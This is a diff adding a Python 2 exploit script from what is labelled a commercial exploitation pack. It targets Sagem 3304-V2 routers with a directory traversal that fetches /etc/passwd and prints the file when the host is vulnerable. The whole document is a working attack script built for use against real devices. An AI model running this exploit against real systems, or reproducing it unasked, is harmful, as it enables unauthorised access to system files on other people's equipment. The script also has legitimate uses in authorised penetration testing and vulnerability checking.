@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_sagem_1'
+_vendor_ = 'sagem'
+_model_  = ['3304-V2']
+_vuln_   = 'Directory Traversal'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/%%2f..%%2f..%%2f..%%2f..%%2f..%%2f..%%2f..%%2f..%%2f..%%2f..%%2fetc%%2fpasswd' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  value = nfo.getvalue()
+  if status == 200 and 'root:0' in value:
+    print '[+] %s vulnerable' % host
+    print '%s' % value
+    return
+  print '[+] %s not vulnerable' % host
+  return 
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
